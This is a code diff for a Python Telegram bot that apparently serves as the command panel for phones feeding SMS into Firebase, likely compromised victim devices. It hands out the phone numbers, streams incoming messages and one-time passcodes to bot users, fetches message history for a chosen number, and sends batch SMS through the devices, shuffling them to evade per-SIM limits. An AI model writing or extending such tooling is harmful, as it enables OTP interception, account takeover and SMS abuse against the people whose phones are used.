@@ -46,6 +46,7 @@ ADMIN_WAIT_PAYLOAD = 5
 BLOCKED_USERS = set()
 active_otp_sessions = {}   # user_id: {"stop": False, "task": asyncio.Task}
 active_send_tasks = {}     # user_id: {"stop": False}
+global_seen_messages = set() # To strictly prevent duplicate OTP alerts
 
 # --- AIOHTTP Web Server for Render & UptimeRobot ---
 async def health_check(request):
@@ -61,15 +62,14 @@ async def start_web_server():
     await site.start()
     print(f"Web server started on port {port} for UptimeRobot.")
 
-# --- Firebase & Utility Helpers ---
+# --- Firebase Helpers ---
 async def fetch_json(url):
     async with aiohttp.ClientSession() as session:
         try:
             async with session.get(f"{url}.json", timeout=10) as response:
                 if response.status == 200:
                     return await response.json()
-        except Exception:
-            pass
+        except Exception: pass
     return None
 
 async def put_json(url, payload):
@@ -77,9 +77,32 @@ async def put_json(url, payload):
         try:
             async with session.put(f"{url}.json", json=payload, timeout=5) as response:
                 return response.status == 200
-        except Exception:
-            pass
+        except Exception: pass
     return False
+
+async def post_json(url, payload):
+    """POST to Firebase to create a unique ID under a node."""
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.post(f"{url}.json", json=payload, timeout=5) as response:
+                return response.status == 200
+        except Exception: pass
+    return False
+
+async def log_action_to_firebase(user_id, user_name, action, details=""):
+    """Logs every bot action to the /mobile/logs node in the primary database."""
+    if not FIREBASE_URLS: return
+    primary_db = FIREBASE_URLS[0]
+    ist_tz = timezone(timedelta(hours=5, minutes=30))
+    payload = {
+        "timestamp": int(time.time() * 1000),
+        "date_time": datetime.now(ist_tz).strftime('%Y-%m-%d %H:%M:%S'),
+        "user_id": user_id,
+        "user_name": user_name,
+        "action": action,
+        "details": details
+    }
+    await post_json(f"{primary_db}/mobile/logs", payload)
 
 def clean_mobile_number(raw_num):
     if not raw_num: return None
@@ -100,18 +123,45 @@ def get_latest_timestamp(client_data):
     return max(timestamps)
 
 def is_authorized(user_id):
-    """Check if user has access and is not blocked."""
     return user_id in ACCESS_USERS and user_id not in BLOCKED_USERS
 
 async def notify_admin(context, message):
     if ADMIN_CHAT_ID:
         try:
             await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"🛡️ [ADMIN]\n{message}")
-        except Exception:
-            pass
+        except Exception: pass
 
 def get_cancel_keyboard():
     return InlineKeyboardMarkup([[InlineKeyboardButton("Cancel ❌", callback_data="cancel_action")]])
+
+def get_main_menu():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("Get OTP 📩", callback_data="get_otp")],
+        [InlineKeyboardButton("Get Msg on Specific No. 🎯", callback_data="get_specific_no")],
+        [InlineKeyboardButton("Send Message 📤", callback_data="send_message")]
+    ])
+
+# --- General Handlers ---
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if not is_authorized(user.id): return
+    welcome_text = (
+        f"Welcome, {user.first_name}! 👋\n\n"
+        "I am your highly advanced, cross-database Firebase SMS Controller.\n"
+        "Choose an action below:"
+    )
+    await update.message.reply_text(welcome_text, reply_markup=get_main_menu())
+    await log_action_to_firebase(user.id, user.first_name, "STARTED_BOT")
+
+async def cancel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text("Action Cancelled 🛑", reply_markup=get_main_menu())
+    return ConversationHandler.END
+
+async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Action Cancelled 🛑", reply_markup=get_main_menu())
+    return ConversationHandler.END
 
 # --- Admin Commands ---
 async def cmd_block(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -119,15 +169,11 @@ async def cmd_block(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         target_id = int(context.args[0])
         BLOCKED_USERS.add(target_id)
-        
-        # Stop their active tasks
         if target_id in active_otp_sessions:
             active_otp_sessions[target_id]["stop"] = True
-            if active_otp_sessions[target_id].get("task"):
-                active_otp_sessions[target_id]["task"].cancel()
+            if active_otp_sessions[target_id].get("task"): active_otp_sessions[target_id]["task"].cancel()
         if target_id in active_send_tasks:
             active_send_tasks[target_id]["stop"] = True
-            
         await update.message.reply_text(f"✅ User {target_id} blocked and tasks stopped.")
     except (IndexError, ValueError):
         await update.message.reply_text("Usage: /block <chat_id>")
@@ -141,19 +187,6 @@ async def cmd_release(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except (IndexError, ValueError):
         await update.message.reply_text("Usage: /release <chat_id>")
 
-async def cmd_cancelsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_CHAT_ID: return
-    try:
-        target_id = int(context.args[0])
-        if target_id in active_send_tasks:
-            active_send_tasks[target_id]["stop"] = True
-            await update.message.reply_text(f"✅ Stop signal sent to user {target_id}'s batch task.")
-        else:
-            await update.message.reply_text(f"User {target_id} does not have an active sending task.")
-    except (IndexError, ValueError):
-        await update.message.reply_text("Usage: /cancelsend <chat_id>")
-
-# Admin Direct Message
 async def cmd_admin_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID: return
     try:
@@ -174,35 +207,14 @@ async def admin_forward_payload(update: Update, context: ContextTypes.DEFAULT_TY
         await update.message.reply_text(f"❌ Failed to send: {e}")
     return ConversationHandler.END
 
-# --- Main User Flow ---
-def get_main_menu():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("Get OTP 📩", callback_data="get_otp")],
-        [InlineKeyboardButton("Get Msg on Specific No. 🎯", callback_data="get_specific_no")],
-        [InlineKeyboardButton("Send Message 📤", callback_data="send_message")]
-    ])
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    if not is_authorized(user.id): return
-
-    welcome_text = (
-        f"Welcome, {user.first_name}! 👋\n\n"
-        "I am your automated Firebase SMS controller.\n"
-        "Choose an action below:"
-    )
-    await update.message.reply_text(welcome_text, reply_markup=get_main_menu())
-
 # --- Core OTP Workflow ---
 async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_new=False):
     query = update.callback_query
     user = query.from_user
     
-    # Cancel any existing listener for this user
     if user.id in active_otp_sessions:
         active_otp_sessions[user.id]["stop"] = True
-        if active_otp_sessions[user.id].get("task"):
-            active_otp_sessions[user.id]["task"].cancel()
+        if active_otp_sessions[user.id].get("task"): active_otp_sessions[user.id]["task"].cancel()
 
     await query.edit_message_text("Searching databases for an active number... ⏳")
     
@@ -211,27 +223,32 @@ async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_
     
     ist_tz = timezone(timedelta(hours=5, minutes=30))
     now = datetime.now(ist_tz)
-    cutoff_ms = int((now - timedelta(hours=24)).timestamp() * 1000)
     
     all_active_devices = []
-    for fb_url, clients_data in zip(FIREBASE_URLS, results):
-        if not clients_data: continue
-        for dev_id, client in clients_data.items():
-            ts = get_latest_timestamp(client)
-            if ts >= cutoff_ms:
-                raw_num = client.get('mobNo')
-                if not raw_num and isinstance(client.get('sims'), list) and len(client.get('sims')) > 0:
-                    raw_num = client['sims'][0].get('phoneNumber')
-                valid_num = clean_mobile_number(raw_num)
-                if valid_num:
-                    all_active_devices.append({'fb_url': fb_url, 'dev_id': dev_id, 'num': valid_num, 'ts': ts})
+    time_window_mins = 10
+    
+    # Check 10, then 20, up to 1440 mins if nothing found
+    while time_window_mins <= 1440:
+        cutoff_ms = int((now - timedelta(minutes=time_window_mins)).timestamp() * 1000)
+        
+        for fb_url, clients_data in zip(FIREBASE_URLS, results):
+            if not clients_data: continue
+            for dev_id, client in clients_data.items():
+                if get_latest_timestamp(client) >= cutoff_ms:
+                    raw_num = client.get('mobNo')
+                    if not raw_num and isinstance(client.get('sims'), list) and len(client.get('sims')) > 0:
+                        raw_num = client['sims'][0].get('phoneNumber')
+                    valid_num = clean_mobile_number(raw_num)
+                    if valid_num:
+                        all_active_devices.append({'fb_url': fb_url, 'dev_id': dev_id, 'num': valid_num})
+        
+        if all_active_devices: break
+        time_window_mins += 10
 
     if not all_active_devices:
         await query.edit_message_text("❌ No active numbers found.", reply_markup=get_main_menu())
         return
 
-    all_active_devices.sort(key=lambda x: x['ts'], reverse=True)
-    
     previously_used = context.user_data.get('used_numbers', set())
     selected = None
     
@@ -241,16 +258,15 @@ async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_
                 selected = device
                 break
         if not selected:
-            # If all exhausted, clear history and pick random
             previously_used.clear()
-            selected = random.choice(all_active_devices[:5])
+            selected = random.choice(all_active_devices)
     else:
         selected = all_active_devices[0]
 
     context.user_data.setdefault('used_numbers', set()).add(selected['num'])
     
-    action = "Requested New Number" if is_new else "Requested OTP"
-    await notify_admin(context, f"User {user.first_name} {action}: {selected['num']}")
+    await log_action_to_firebase(user.id, user.first_name, "REQUESTED_OTP", f"Allocated Number: {selected['num']}")
+    await notify_admin(context, f"User {user.first_name} Requested OTP on: {selected['num']}")
     
     kb = [
         [InlineKeyboardButton("Get New Number 🔄", callback_data="get_new_number")],
@@ -260,23 +276,22 @@ async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_
         f"✅ **Number Found:** `{selected['num']}`\n"
         f"Status: **Valid for 5 Minutes** ⏱️\n"
         f"Send your SMS. New messages will appear here.",
-        reply_markup=InlineKeyboardMarkup(kb),
-        parse_mode="Markdown"
+        reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown"
     )
 
-    # Launch isolated background listener
     active_otp_sessions[user.id] = {"stop": False}
     task = asyncio.create_task(monitor_otp(context, user.id, query.message.chat_id, selected['fb_url'], selected['dev_id'], selected['num'], 300))
     active_otp_sessions[user.id]["task"] = task
 
 async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number, duration_secs):
     end_time = time.time() + duration_secs
-    seen_ids = set()
     
-    # Pre-populate seen IDs
+    # Pre-populate to avoid fetching historical messages
     initial_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}")
     if initial_msgs:
-        seen_ids = set(str(m.get('id', k)) for k, m in initial_msgs.items() if isinstance(m, dict))
+        for k, m in initial_msgs.items():
+            if isinstance(m, dict):
+                global_seen_messages.add(f"{dev_id}_{m.get('id', k)}")
 
     while time.time() < end_time:
         if active_otp_sessions.get(user_id, {}).get("stop", True): return
@@ -285,28 +300,33 @@ async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number, 
         if fresh_msgs:
             for k, m in fresh_msgs.items():
                 if not isinstance(m, dict): continue
-                msg_id = str(m.get('id', k))
                 
-                if msg_id not in seen_ids and msg_id != '':
-                    seen_ids.add(msg_id)
+                # STRICT FIX: Only process 'incoming' messages to avoid custom message cross-talk
+                if m.get('type') != 'incoming': 
+                    continue
+                    
+                msg_id = str(m.get('id', k))
+                unique_key = f"{dev_id}_{msg_id}"
+                
+                if unique_key not in global_seen_messages and msg_id != '':
+                    global_seen_messages.add(unique_key)
+                    
                     sender = m.get('sender', 'Unknown')
                     text = m.get('message', '')
                     dt = m.get('dateTime', 'Just Now')
-                    
                     alert = f"🔔 **NEW MESSAGE** 🔔\n\n**To:** `{mobile_number}`\n**From:** {sender}\n**Time:** {dt}\n\n**Message:**\n`{text}`"
                     
                     try:
                         await context.bot.send_message(chat_id=chat_id, text=alert, parse_mode="Markdown")
                         await notify_admin(context, f"User {user_id} Received SMS on {mobile_number}:\n{alert}")
-                    except Exception:
-                        pass
+                        await log_action_to_firebase(user_id, "User", "RECEIVED_SMS", f"To: {mobile_number} | From: {sender} | Msg: {text}")
+                    except Exception: pass
         await asyncio.sleep(2)
         
     if not active_otp_sessions.get(user_id, {}).get("stop", False):
         try:
-            await context.bot.send_message(chat_id=chat_id, text=f"⏰ The monitoring window for `{mobile_number}` has expired.", reply_markup=get_main_menu())
-        except Exception:
-            pass
+            await context.bot.send_message(chat_id=chat_id, text=f"⏰ The 5-minute window for `{mobile_number}` has expired.", reply_markup=get_main_menu())
+        except Exception: pass
         active_otp_sessions[user_id]["stop"] = True
 
 # --- Get Message on Specific Number Flow ---
@@ -323,7 +343,7 @@ async def fetch_specific_number(update: Update, context: ContextTypes.DEFAULT_TY
     target_num = clean_mobile_number(raw_num)
     
     if not target_num:
-        await update.message.reply_text("❌ Invalid mobile number format. Please enter a valid 10-digit number.", reply_markup=get_cancel_keyboard())
+        await update.message.reply_text("❌ Invalid format. Please enter a valid 10-digit number.", reply_markup=get_cancel_keyboard())
         return ASK_SPECIFIC_NUMBER
 
     status_msg = await update.message.reply_text("Searching databases for this number (last 60 mins)... ⏳")
@@ -338,11 +358,10 @@ async def fetch_specific_number(update: Update, context: ContextTypes.DEFAULT_TY
         if not clients_data: continue
         for dev_id, client in clients_data.items():
             if get_latest_timestamp(client) >= cutoff_ms:
-                client_num = clean_mobile_number(client.get('mobNo'))
-                if not client_num and isinstance(client.get('sims'), list) and len(client.get('sims')) > 0:
-                    client_num = clean_mobile_number(client['sims'][0].get('phoneNumber'))
-                
-                if client_num == target_num:
+                c_num = clean_mobile_number(client.get('mobNo'))
+                if not c_num and isinstance(client.get('sims'), list) and len(client.get('sims')) > 0:
+                    c_num = clean_mobile_number(client['sims'][0].get('phoneNumber'))
+                if c_num == target_num:
                     found_device = (fb_url, dev_id)
                     break
         if found_device: break
@@ -353,22 +372,22 @@ async def fetch_specific_number(update: Update, context: ContextTypes.DEFAULT_TY
 
     fb_url, dev_id = found_device
     await notify_admin(context, f"User {user.first_name} requested specific tracking for {target_num}")
+    await log_action_to_firebase(user.id, user.first_name, "TRACKED_SPECIFIC_NUMBER", f"Number: {target_num}")
     
-    # Fetch last 10 messages
+    # Fetch last 10 messages (Incoming only)
     device_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}") or {}
-    sorted_msgs = sorted([m for m in device_msgs.values() if isinstance(m, dict)], key=lambda x: int(x.get('id', 0)) if str(x.get('id', '')).isdigit() else 0)
+    incoming_msgs = [m for m in device_msgs.values() if isinstance(m, dict) and m.get('type') == 'incoming']
+    sorted_msgs = sorted(incoming_msgs, key=lambda x: int(x.get('id', 0)) if str(x.get('id', '')).isdigit() else 0)
     last_10 = sorted_msgs[-10:] if len(sorted_msgs) >= 10 else sorted_msgs
     
-    msg_history = f"✅ **Found Number:** `{target_num}`\n\n**--- Last {len(last_10)} Messages ---**\n"
+    msg_history = f"✅ **Found Number:** `{target_num}`\n\n**--- Last {len(last_10)} Incoming Messages ---**\n"
     for m in last_10:
         msg_history += f"[{m.get('dateTime', '')}] {m.get('sender', '')}: {m.get('message', '')}\n\n"
-    
     msg_history += "📡 **Starting Real-Time Listening (5 Mins)...**"
     
     kb = [[InlineKeyboardButton("Cancel Listening ❌", callback_data="cancel_number")]]
     await status_msg.edit_text(msg_history, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
     
-    # Start Monitor
     if user.id in active_otp_sessions and active_otp_sessions[user.id].get("task"):
         active_otp_sessions[user.id]["task"].cancel()
         
@@ -417,6 +436,7 @@ async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def run_batch_send(context, user, target_number, msg_text, quantity, status_msg):
     await notify_admin(context, f"User {user.first_name} sending {quantity} msgs to {target_number}.\n\nPayload:\n`{msg_text}`")
+    await log_action_to_firebase(user.id, user.first_name, "BATCH_SEND_STARTED", f"Target: {target_number} | Qty: {quantity} | Msg: {msg_text}")
 
     cutoff_ms = int((datetime.now(timezone.utc) - timedelta(minutes=10)).timestamp() * 1000)
     fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
@@ -430,8 +450,11 @@ async def run_batch_send(context, user, target_number, msg_text, quantity, statu
                 active_devices.append((fb_url, dev_id))
 
     if not active_devices:
-        await status_msg.edit_text("❌ No active devices in the last 10 minutes to process request.", reply_markup=get_main_menu())
+        await status_msg.edit_text("❌ No active devices found to process request.", reply_markup=get_main_menu())
         return
+
+    # To avoid the 100 SMS limit per SIM, shuffle devices to spread the load randomly
+    random.shuffle(active_devices)
 
     success, failed = 0, 0
     kb = [[InlineKeyboardButton("Stop Sending 🛑", callback_data="stop_sending")]]
@@ -447,12 +470,13 @@ async def run_batch_send(context, user, target_number, msg_text, quantity, statu
             "isSended": False,
             "from": 1,
             "_wake": True,
+            "type": "outgoing",  # Ensure it doesn't trigger OTP listeners
             "_nonce": f"wake_{int(time.time() * 1000)}"
         }
         
         webhook_url = f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms"
         await put_json(webhook_url, payload)
-        success += 1 # Auto mark success as requested
+        success += 1 # Auto mark success 
 
         if i % 3 == 0 or i == quantity:
             filled = int(15 * i / quantity)
@@ -462,17 +486,17 @@ async def run_batch_send(context, user, target_number, msg_text, quantity, statu
                     f"**Sending Messages...** 🚀\n{bar} {i}/{quantity}\nSuccess: {success} | Failed: {failed}",
                     parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb)
                 )
-            except Exception:
-                pass
+            except Exception: pass
         await asyncio.sleep(0.5)
 
     final_report = (
-        f"✅ **Batch Send Complete / Stopped** ✅\n\n"
+        f"✅ **Batch Send Finished** ✅\n\n"
         f"Target: `{target_number}`\nTotal Processed: {success + failed}/{quantity}\n"
         f"Successful: {success}\nFailed: {failed}"
     )
     await status_msg.edit_text(final_report, parse_mode="Markdown", reply_markup=get_main_menu())
-    await notify_admin(context, f"Batch for {user.first_name}:\n{final_report}")
+    await notify_admin(context, f"Batch complete for {user.first_name}:\n{final_report}")
+    await log_action_to_firebase(user.id, user.first_name, "BATCH_SEND_COMPLETED", f"Target: {target_number} | Success: {success} | Failed: {failed}")
 
 # --- General Callback Handler ---
 async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -489,25 +513,12 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "cancel_number":
         if user.id in active_otp_sessions:
             active_otp_sessions[user.id]["stop"] = True
-            if active_otp_sessions[user.id].get("task"):
-                active_otp_sessions[user.id]["task"].cancel()
+            if active_otp_sessions[user.id].get("task"): active_otp_sessions[user.id]["task"].cancel()
             await query.edit_message_text("🛑 OTP monitoring cancelled.", reply_markup=get_main_menu())
-            await notify_admin(context, f"User {user.first_name} cancelled their OTP session.")
     elif data == "stop_sending":
         if user.id in active_send_tasks:
             active_send_tasks[user.id]["stop"] = True
-            await query.edit_message_text("🛑 Stopping message batch...", parse_mode="Markdown")
-
-async def cancel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handles global cancel button for conversations."""
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text("Action Cancelled 🛑", reply_markup=get_main_menu())
-    return ConversationHandler.END
-
-async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Action Cancelled 🛑", reply_markup=get_main_menu())
-    return ConversationHandler.END
+            await query.edit_message_text("🛑 Stopping message batch... please wait.", parse_mode="Markdown")
 
 # --- Application Startup Hook ---
 async def post_init(application: Application):
